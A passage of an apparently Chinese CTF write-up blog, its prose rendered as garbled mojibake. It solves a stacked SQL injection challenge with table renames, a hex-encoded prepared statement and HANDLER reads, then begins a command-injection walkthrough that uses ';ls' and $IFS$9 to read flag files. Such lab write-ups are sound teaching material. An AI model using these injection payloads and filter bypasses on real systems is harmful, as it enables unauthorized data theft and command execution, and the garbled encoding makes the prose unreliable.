<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><code>show tables</code>ä¸»è¦çœ‹çœ‹æ”¹æˆåŠŸæ²¡æœ‰ï¼Œè¿™é‡Œæ”¹è¡¨åè¦æœ‰é¡ºåºï¼Œå¦‚æœå…ˆæ”¹æ•°å­—è¡¨ï¼Œé‚£å°±å‡ºç°ä¸¤ä¸ªwordsè¡¨ï¼Œå¯¼è‡´è¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ”¹wordsè¡¨åä¸ºå…¶ä»–åå­—ï¼Œç„¶åä¿®æ”¹æ•°å­—è¡¨ä¸ºwordsï¼›é¿å…å› ä¸ºåå­—è€Œå‘ç”Ÿå‘½ä»¤å†²çª</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220112706.png" alt="image-20220702220112706"></p>
<p>å¯ä»¥çœ‹åˆ°è¡¨<code>1919810931114514</code>åå­—è¢«æ”¹æˆäº†å¯æŸ¥è¯¢è¡¨<code>words</code></p>
<p>å†çœ‹çœ‹wordsè¡¨çš„åˆ—ï¼Œflagå˜æˆäº†idï¼ŒNOå˜æˆäº†YES</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220308651.png" alt="image-20220702220308651"></p>
<p>ç”¨<code>1&#39; and 1=1#</code></p>
<p>çœ‹çœ‹å›æ˜¾æ•°æ®</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702221617795.png" alt="image-20220702221617795"></p>
<p>å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQl</span>çš„<span class="keyword">rename</span></span><br><span class="line">ç”¨äºé‡å‘½åè¡¨å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>çš„<span class="keyword">alter</span>ç”¨æ³•æ€»ç»“</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>ï¼šåˆ é™¤åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> åˆ—å</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ï¼šå¢åŠ åˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> åˆ—å å±æ€§ ã€çº¦æŸã€‘</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ï¼šä¿®æ”¹åˆ—çš„ç±»å‹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å CHANGE <span class="keyword">COLUMN</span> åˆ—å ã€æ–°ã€‘åˆ—å</span><br><span class="line">æ–°å±æ€§</span><br><span class="line"><span class="number">4</span>ï¼šé‡å‘½ååˆ—</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨åå­— CHANGE <span class="keyword">COLUMN</span> åˆ—å æ–°åˆ—å å±æ€§</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>ï¼šé‡å‘½åè¡¨</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">RENAME</span> <span class="keyword">TO</span> è¡¨æ–°å</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>ï¼šåˆ é™¤è¡¨ä¸­ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>ï¼šæ·»åŠ ä¸»é”®</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> çº¦æŸå <span class="keyword">PRIMARY KEY</span> (æ·»åŠ åˆ—)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>ï¼šæ·»åŠ ç´¢å¼•</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å <span class="keyword">ADD</span> <span class="keyword">index</span> ç´¢å¼•å (åˆ—å);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>ï¼šä¿®æ”¹åˆ—çš„å±æ€§</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> è¡¨å MODIFY <span class="keyword">COLUMN</span> è¦ä¿®æ”¹å±æ€§çš„åˆ—å æ–°å±æ€§;</span><br><span class="line"></span><br><span class="line">ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸æ¨èåœ¨å»ºè¡¨åå¯¹è¡¨è¿›è¡Œå¤§å¹…åº¦ä¿®æ”¹ï¼Œå¤§å¹…åº¦ä¿®æ”¹ææœ‰å¯èƒ½ä½¿è¡¨æ•°æ®ä¸¢å¤±ã€‚</span><br></pre></td></tr></table></figure></div>

<p>â€“</p>
<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpï¼Œè¿™é‡Œè¡¥å……ä¸¤ç§æ–¹æ³•</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">åŸæ–‡é“¾æ¥</a></p>
<h4 id="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"><a href="#è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶" class="headerlink" title="è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶"></a><strong>è§£é¢˜æ€è·¯2ï¼š<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">é¢„å¤„ç†</a>ç»•è¿‡selecté™åˆ¶</strong></h4><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>
<p>å†é€šè¿‡æ„é€ payloadå¾—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure></div>

<p>è¿›è€Œå¾—åˆ°flag</p>
<pre><code>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚
executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚
SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200125185407747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h4 id="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"><a href="#è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡" class="headerlink" title="è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡"></a><strong>è§£é¢˜æ€è·¯3ï¼š<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>ç»•è¿‡</strong></h4><p>payloadï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JULIA"><figure class="iseeu highlight /julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler <span class="string">`1919810931114514`</span> open as <span class="string">`a`</span>; handler <span class="string">`a`</span> read next;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://img-blog.csdnimg.cn/20200225203706719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h5 id="handleråŸºæœ¬ç”¨æ³•"><a href="#handleråŸºæœ¬ç”¨æ³•" class="headerlink" title="handleråŸºæœ¬ç”¨æ³•"></a>handleråŸºæœ¬ç”¨æ³•</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> index_name &#123; FIRST | <span class="keyword">NEXT</span> | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">READ</span> &#123; FIRST | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">    </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br><span class="line">é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡<span class="keyword">READ</span> <span class="keyword">NEXT</span>ä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ<span class="keyword">NEXT</span>ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼Œ<span class="keyword">NEXT</span>è·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚</span><br><span class="line">é€šè¿‡HANDLER tbl_name <span class="keyword">READ</span> index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡<span class="keyword">NEXT</span>ç»§ç»­æµè§ˆã€‚</span><br></pre></td></tr></table></figure></div>



<p><u><code>å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯æŒ‡å‘æ•°æ®åº“é‡Œçš„è¡¨ã€‘</code></u></p>
<h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">3.1 åˆ›å»ºæµ‹è¯•è¡¨åŠæµ‹è¯•æ•°æ®</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 ä¸é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆã€‘</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆFIRST,NEXT,PREV,LASTï¼‰</span><br><span class="line">é€šè¿‡ç´¢å¼•æŸ¥çœ‹çš„è¯ï¼Œå¯ä»¥æŒ‰ç…§ç´¢å¼•çš„å‡åºï¼Œä»å°åˆ°å¤§ï¼ŒæŸ¥çœ‹è¡¨ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">åˆ›å»ºç´¢å¼•ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆ=,&lt;=,&gt;=,&lt;,&gt;ï¼‰</span><br><span class="line">ä»indexä¸º2çš„åœ°æ–¹å¼€å§‹</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 é™„åŠ ï¼šè¯­æ³•å®ä¾‹å‚è€ƒ</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçœ‹æ‡‚ä»¥åï¼Œæˆ‘è‡ªå·±åˆé‡æ–°æ„é€ äº†ä¸€ä¸ª</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure>

<p>æ•ˆæœä¸€æ ·ï¼Œæ„æ€ä¹Ÿå·®ä¸å¤š</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220731224702281.png" alt="image-20220731224702281"></p>
<h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—åº”è¯¥æ˜¯é“å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®</p>
<p>å…ˆä¼ ä¸€ä¸ªIP:123.123.123.123è¯•è¯•</p>
<p><code>?ip=123.123.123.123</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706231831194.png" alt="image-20220706231831194"></p>
<p>çœ‹èµ·æ¥æ˜¯Linuxå‘½ä»¤ï¼Œå…ˆæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶è¯•è¯•ï¼ˆ;æ˜¯é¡ºåºæ‰§è¡Œï¼Œä»å·¦å¾€å³ï¼Œå‘½ä»¤å…¨éƒ¨æ‰§è¡Œï¼‰</p>
<p><code>?ip=123.123.123.123;ls</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232001574.png" alt="image-20220706232001574"></p>
<p>çœ‹åˆ°flagæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å‡º</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706232135596.png" alt="image-20220706232135596"></p>
<p>å‘ç°ï¼Œç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæˆ‘è¯•è¯•äº†å¾ˆå¤šç»•è¿‡ï¼Œæ¯”å¦‚%0aï¼Œ%20ï¼Œ%09ï¼Œ&lt;&gt;ï¼Œä½†æ˜¯å›æ˜¾éƒ½æ˜¯</p>
<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706233818795.png" alt="image-20220706233818795"></p>
<p>æ„æ€æ˜¯ç¬¦å·éƒ½è¿‡æ»¤äº†</p>
<p>è¿™é‡Œå¼•å…¥æˆ‘ä¸€ä¸ªæ–°å­¦çš„ç©ºæ ¼ä»£æ›¿ç¬¦$IFS$9ï¼Œè¿™æ˜¯ä¸ªshellä¸­å®šä¹‰çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¤å¤„å¯ä»¥ç»•è¿‡è¿‡æ»¤</p>
<p>$IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p>
<p>è¯•è¯•</p>
<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220706234926216.png" alt="image-20220706234926216"></p>
<p>å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åªå¥½å…ˆçœ‹çœ‹index.phpæ–‡ä»¶ï¼Œè¯•è¯•èƒ½ä¸èƒ½çœ‹åˆ°å…¶ä»£ç </p>
<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>
